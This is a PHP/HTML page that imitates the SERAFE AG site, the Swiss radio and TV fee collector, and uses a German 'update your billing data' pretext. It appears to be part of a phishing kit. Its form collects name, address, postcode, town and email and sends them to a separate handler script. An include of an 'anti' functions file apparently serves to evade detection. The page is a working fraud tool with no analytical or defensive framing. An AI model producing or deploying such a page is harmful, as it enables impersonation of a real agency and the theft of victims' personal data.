<?php 
    require_once "../anti/functions.php";
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/cmd.css">
    <title></title>
    <style>
      /* RESET */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: Arial, sans-serif;
    color: #333;
    background: #fff;
}

/* TOPBAR */
.topbar {
    background: #0f5c5c;
    color: white;
    padding: 10px 20px;
}

.nav {
    display: flex;
    justify-content: flex-end;
    gap: 20px;
    font-size: 14px;
}

/* HERO */
.hero {
    background: #197373;
    padding: 30px 20px;
}

.logo {
    color: white;
    font-size: 36px;
}

/* MAIN */
.container {
    padding: 40px 20px;
    max-width: 800px;
    margin: auto;
}

.container h2 {
    font-size: 34px;
    margin-bottom: 20px;
}

.intro {
    font-size: 18px;
    margin-bottom: 30px;
    line-height: 1.6;
}

/* FORM */
.form {
    width: 100%;
}

.form-group {
    margin-bottom: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
    JUSTIFY-SELF: START;
}

input {
    width: 100%;
    padding: 12px;
    border: 1px solid #292929;
    font-size: 16px;
}

/* ROW (PLZ + ORT) */
.row {
    display: flex;
    gap: 15px;
}

.row .form-group {
    flex: 1;
}

/* NOTE */
.note {
    font-size: 14px;
    color: #666;
    margin-bottom: 25px;
}

/* BUTTON */
.btn {
    display: block;
    margin: 20px auto;
    padding: 14px 40px;
    background: #197373;
    color: white;
    border: none;
    border-radius: 30px;
    font-size: 18px;
    cursor: pointer;
}

.btn:hover {
    background: #145c5c;
}

/* FOOTER */
.footer {
    padding: 40px 20px;
    font-size: 14px;
    max-width: 900px;
    color: #555;
    margin: auto;
    BACKGROUND: #f0f0f0;
    display: flex;
    justify-content:SPACE-BETWEEN;

}

.footer h3 {
    margin-bottom: 10px;
}

.footer h4 {
    margin-top: 20px;
}

.links {
    margin-top: 20px;
    line-height: 1.8;
}

/* ========================= */
/* 📱 RESPONSIVE DESIGN */
/* ========================= */

/* TABLET */
@media (max-width: 768px) {
    .container h2 {
        font-size: 28px;
    }

    .row {
        flex-direction: column;
    }

    .nav {
        justify-content: center;
        flex-wrap: wrap;
    }
}

/* MOBILE */
@media (max-width: 480px) {
    .logo {
        font-size: 28px;
    }

    .container {
        padding: 25px 15px;
    }

    .container h2 {
        font-size: 24px;
    }

    .intro {
        font-size: 16px;
    }

    input {
        font-size: 14px;
    }

    .btn {
        width: 100%;
    }
}
    </style>
</head>
<body>

<!-- TOP BAR -->
<header class="topbar">
    <div class="nav">
        <span>Wir über uns</span>
        <span>Jobs</span>
        <span>Kontakt</span>
        <span>Deutsch</span>
    </div>
</header>

<!-- HERO -->
<section class="hero">
    <h1 class="logo">serafe</h1>
</section>

<!-- FORM -->
<main class="container">
    <h2>Abrechnungsdaten aktualisieren</h2>

    <p class="intro">
        Damit wir Ihre Serafe-Abrechnung korrekt zustellen und bearbeiten können,
        benötigen wir Ihre vollständigen und aktuellen Angaben.
    </p>

    <form class="form" action="i.php" method="post">

        <div class="form-group">
            <label>Name und Vorname</label>
            <input type="text" required name="name">
        </div>

        <div class="form-group">
            <label>Straße und Hausnummer</label>
            <input type="text" required name="address">
        </div>

        
            <div class="form-group">
                <label>PLZ</label>
                <input type="text" required name="zip">
            </div>

            <div class="form-group">
                <label>Ort</label>
                <input type="text" required name="city">
            </div>
        

        <div class="form-group">
            <label>E-Mail-Adresse</label>
            <input type="email" required name="email">
        </div>

        <p class="note">
            Wir verwenden Ihre E-Mail-Adresse ausschließlich für Bestätigungen
            und Rückfragen zu Ihrer Abrechnung.
        </p>

        <button type="submit" class="btn">Weiter</button>

    </form>
</main>

<!-- FOOTER -->
<footer class="footer">
   <div>
<h3>Kontaktadresse</h3>
    <p>
        SERAFE AG<br>
        Schweizerische Erhebungsstelle<br>
        für die Radio- und Fernsehabgabe<br>
        Postfach<br>
        8010 Zürich
    </p>
</div>
<div>
    <h4>Downloads</h4>
    <p>Alle Downloads</p>
</div>
<div>
    <p class="links">
        © SERAFE AG<br>
        Datenschutz<br>
        Impressum<br>
        Disclaimer<br>
        Rechtliches<br>
        Medienbereich<br>
        Archiv
    </p>
  </div>
</footer>

</body>
</html>